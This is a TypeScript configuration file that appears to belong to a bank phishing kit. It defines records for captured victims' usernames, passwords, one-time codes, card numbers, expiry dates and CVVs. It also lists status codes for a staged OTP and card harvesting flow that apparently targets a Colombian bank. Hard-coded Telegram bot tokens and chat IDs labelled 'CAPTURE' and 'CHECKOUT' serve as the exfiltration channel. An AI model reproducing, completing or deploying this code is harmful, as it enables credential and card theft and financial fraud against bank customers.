// Database connection configuration
// Note: In production, use a proper database like PostgreSQL, MySQL, or MongoDB
// For now, we'll use a simple JSON file storage

export interface UserRecord {
    idreg: number;
    usuario: string;
    password: string;
    otp: string | null;
    dispositivo: string;
    ip: string;
    id: string | null;
    agente: string | null;
    banco: string;
    status: number;
    horacreado: string;
    horamodificado: string;
    email: string | null;
    cemail: string | null;
    celular: string | null;
    documentType: string | null;
    tarjeta: string | null;
    ftarjeta: string | null;
    cvv: string | null;
}

// Status codes
export const STATUS_CODES = {
    USER_ENTERED: 1,
    OTP_REQUESTED: 2,
    OTP_ENTERED: 3,
    ERROR_923: 4,
    EMAIL_ENTERED: 5,
    CARD_REQUESTED: 6,
    CARD_ENTERED: 7,
    NEW_OTP_REQUESTED: 8,
    NEW_OTP_ENTERED: 9,
    FINISHED: 10,
    NEW_USER_REQUESTED: 12,
    ATM: 25,
    TOKEN_BOGOTA_SENT: 40,
    ERROR_CC: 41,
    ERROR_BOGOTA: 42,
    TOKEN_BOGOTA: 923
};

// Telegram configuration
export const CHECKOUT_TELEGRAM_CONFIG = {
    BOT_TOKEN: '8563476678:AAG9Xd95Tdg-MkovuTy_WzHOmcEMCMAo55w',
    CHAT_ID: '-5175091667'
};

export const CAPTURE_TELEGRAM_CONFIG = {
    BOT_TOKEN: '8432314500:AAFgLWr6uD-VBj-y2uyAxuAyPrFQ5oIZH6c',
    CHAT_ID: '-5269167790'
};

// Legacy (kept for safety if used elsewhere)
export const TELEGRAM_CONFIG = CAPTURE_TELEGRAM_CONFIG;
